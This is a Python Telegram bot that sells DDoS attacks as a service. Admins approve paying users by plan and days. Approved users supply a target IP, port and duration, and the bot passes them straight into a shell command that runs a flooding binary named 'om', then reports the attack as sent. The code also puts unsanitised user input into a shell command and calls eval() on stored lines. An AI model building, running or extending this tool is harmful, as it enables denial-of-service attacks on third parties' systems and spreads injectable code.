import time
import requests
import logging
from threading import Thread
import json
import os
import telebot
import asyncio
from datetime import datetime, timedelta


# Set the expiry date (year, month, day)
expiry_date = datetime(2025, 10, 15)

# Check the current date
current_date = datetime.now()

# Compare current date with expiry date
if current_date > expiry_date:
    print("This script has expired. File is by @X9HYDRA.")
else:
    print("This  File made by @X9HYDRA.")
    # Continue with the rest of your script below
    
# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            try:
                user_data = json.loads(line.strip())
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

# Initialize users
users = load_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Async function to run attack command
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    command = f"./om {target_ip} {target_port} {duration} 150"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

        # Notify user when the attack finishes
        bot.send_message(chat_id,"𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀This Ddos made by @x9hydra")
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    for user in users:
        if user['user_id'] == user_id and user['plan'] > 0:
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*You Are Not Authorized ⚠*", parse_mode='Markdown')

# Approve or disapprove a user
@bot.message_handler(commands=['approve', 'disapprove'])
def approve_or_disapprove_user(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if not is_user_admin(user_id):
        bot.send_message(chat_id, "*You Are Not Authorized ⚠*", parse_mode='Markdown')
        return

    if len(cmd_parts) < 2:
        bot.send_message(chat_id, "*Invalid command format. Use /approve <user_id> <plan> <days> or /disapprove <user_id>.*", parse_mode='Markdown')
        return

    action = cmd_parts[0]
    target_user_id = int(cmd_parts[1])
    plan = int(cmd_parts[2]) if len(cmd_parts) >= 3 else 0
    days = int(cmd_parts[3]) if len(cmd_parts) >= 4 else 0

    if action == '/approve':
        valid_until = (datetime.now() + timedelta(days=days)).date().isoformat() if days > 0 else datetime.now().date().isoformat()
        user_info = {"user_id": target_user_id, "plan": plan, "valid_until": valid_until, "access_count": 0}

        users.append(user_info)
        save_users(users)

        msg_text = f"*User {target_user_id} approved with plan {plan} for {days} days.*"
    else:  # disapprove
        users[:] = [user for user in users if user['user_id'] != target_user_id]
        save_users(users)

        msg_text = f"*User {target_user_id} disapproved and reverted to free.*"

    bot.send_message(chat_id, msg_text, parse_mode='Markdown')

# Attack command
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id), loop)
        bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds\nThis Ddos made by @x9hydra")
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

# /owner command handler
@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @X9HYDRA"
    bot.send_message(message.chat.id, owner_message)

# Status command
@bot.message_handler(commands=['status'])
def status_command(message):
    try:
        response = "*System status information*"
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in status command: {e}")

# Approve list command
@bot.message_handler(commands=['approve_list'])
def approve_list_command(message):
    try:
        if not is_user_admin(message.from_user.id):
            send_not_approved_message(message.chat.id)
            return

        approved_users = [user for user in users if user['plan'] > 0]

        if not approved_users:
            bot.send_message(message.chat.id, "No approved users found.")
        else:
            response = "\n".join([f"User ID: {user['user_id']}, Plan: {user['plan']}, Valid Until: {user['valid_until']}" for user in approved_users])
            bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in approve_list command: {e}")

# Start asyncio thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Welcome message and buttons when the user sends /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username

    # Create the markup and buttons
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = KeyboardButton("Attack 🚀")
    btn_account = KeyboardButton("My Account🏦")
    markup.add(btn_attack, btn_account)

    # Welcome message
    welcome_message = (f"Welcome, {username}!\n\n"
                       f"This Ddos made by @x9hydra.")

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

# /owner command handler
@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed by X9HYDRA"
    bot.send_message(message.chat.id, owner_message)

# Handle messages
@bot.message_handler(func=lambda message: True)
def echo_message(message):
    try:
        if message.text == "Attack 🚀":
            attack_command(message)
        elif message.text == "My Account🏦":
            user_id = message.from_user.id
            with open(USERS_FILE, 'r') as file:
                for line in file:
                    user_data = eval(line.strip())
                    if user_data['user_id'] == user_id:
                        username = message.from_user.username
                        plan = user_data.get('plan', 'N/A')
                        valid_until = user_data.get('valid_until', 'N/A')
                        current_time = datetime.now().isoformat()
                        response = (f"*USERNAME: {username}\n"
                                    f"Plan: {plan}\n"
                                    f"Valid Until: {valid_until}\n"
                                    f"Current Time: {current_time}*")
                        bot.reply_to(message, response, parse_mode='Markdown')
                        return
            bot.reply_to(message, "*You are not an approved user.*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "Invalid option. Please choose from the available options.")
    except Exception as e:
        logging.error(f"Error in echo_message: {e}")

# Start the bot
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    loop = asyncio.new_event_loop()
    thread = Thread(target=start_asyncio_thread)
    thread.start()
    bot.polling()
